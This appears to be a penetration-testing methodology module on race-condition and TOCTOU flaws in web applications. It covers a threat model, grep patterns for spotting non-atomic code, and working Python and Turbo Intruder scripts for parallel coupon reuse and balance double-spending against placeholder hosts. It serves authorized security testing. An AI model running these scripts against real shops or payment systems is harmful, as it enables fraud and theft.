# VULN MODULE — Race Conditions & TOCTOU
# Asset: webapp
# CWE-362 / CWE-367 | Report prefix: WEB-RACE

## THREAT MODEL

Race conditions occur when the outcome of concurrent operations depends on
timing. In web apps, two categories:

TOCTOU (Time-of-Check to Time-of-Use):
  App checks a condition (e.g. balance >= amount) then later uses it.
  Between check and use, another request changes the condition.

Limit Race:
  App enforces a one-time limit (use coupon once, claim prize once).
  Concurrent requests all pass the check before any registers the use.

## HIGH-VALUE TARGETS

- Payment flows: double-spending, negative balance
- Coupon/voucher: use once = use multiple times
- Rate-limited actions: password resets, OTP generation
- File operations: concurrent upload + parse
- Account operations: concurrent delete + create same username

## WHITEBOX PATTERNS

```bash
# Non-atomic check-then-act patterns
grep -rn "if.*balance\|if.*credits\|if.*limit\|if.*count" \
  --include="*.php" --include="*.py" --include="*.js" -A5 | \
  grep -v "atomic\|transaction\|lock\|mutex\|semaphore"

# Database transactions (look for missing transactions)
grep -rn "SELECT.*balance\|SELECT.*quantity\|SELECT.*count" \
  --include="*.php" --include="*.py"
# Check: is there a BEGIN TRANSACTION / SELECT FOR UPDATE wrapping the check?
# Missing = race condition candidate

# Non-atomic file operations
grep -rn "file_exists\|os\.path\.exists" --include="*.php" --include="*.py" -A3

# Coupon/token single-use enforcement
grep -rn "used.*=.*1\|is_used\|redeemed\|consumed" \
  --include="*.php" --include="*.py"
# Check: is UPDATE atomic with the SELECT?
```

## EXPLOITATION TECHNIQUES

### Technique 1 — Parallel requests (Burp Turbo Intruder)
```python
# Burp Suite → Turbo Intruder → use this script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)
    # Send 50 identical requests simultaneously
    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### Technique 2 — Single-packet attack (HTTP/2)
```bash
# HTTP/2 allows multiple requests in one TCP packet → true simultaneous delivery
# Use: Burp Suite Pro → Send group (parallel) with HTTP/2

# Or with curl:
# First, confirm HTTP/2 support:
curl -sI --http2 https://target.com | head -1

# Then send parallel HTTP/2 requests:
python3 << 'EOF'
import threading, httpx

def send():
    r = httpx.post('https://target.com/redeem',
                   data={'coupon': 'SAVE50'},
                   cookies={'session': 'VALID_SESSION'})
    print(r.status_code, r.text[:100])

threads = [threading.Thread(target=send) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
EOF
```

### Technique 3 — Last-byte synchronization
```bash
# Send all requests with Connection: keep-alive
# Buffer the last byte of each request
# Release all final bytes simultaneously
# Tool: Burp Suite's "Send group in parallel (last-byte sync)"
```

### Specific Attack: Coupon Reuse
```python
import concurrent.futures, requests

SESSION = 'YOUR_SESSION_COOKIE'
URL = 'https://target.com/apply-coupon'

def apply_coupon():
    return requests.post(URL,
        data={'coupon_code': 'DISCOUNT50', 'cart_id': '123'},
        cookies={'session': SESSION})

# Send 20 concurrent requests
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futures = [ex.submit(apply_coupon) for _ in range(20)]
    results = [f.result() for f in futures]

# Count successful applications
success = sum(1 for r in results if 'applied' in r.text.lower())
print(f"Coupon applied {success} times out of 20 attempts")
```

### Specific Attack: Balance Double-Spend
```python
import concurrent.futures, requests

# Scenario: transfer $100 when balance is $100
def transfer():
    return requests.post('https://target.com/transfer',
        data={'to': 'attacker', 'amount': 100},
        cookies={'session': SESSION})

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    futures = [ex.submit(transfer) for _ in range(10)]
    for f in concurrent.futures.as_completed(futures):
        r = f.result()
        if 'success' in r.text.lower():
            print(f"SUCCESS: {r.text[:200]}")
```

## CONFIRMATION CRITERIA

A race condition is CONFIRMED when:
1. Running N parallel requests produces M successful results where M > expected limit
2. The application state reflects the race outcome (balance went negative, coupon used N times)
3. Reproducible across multiple test runs

For reporting: include the success rate (e.g. "12/20 requests succeeded, expected 1/20")
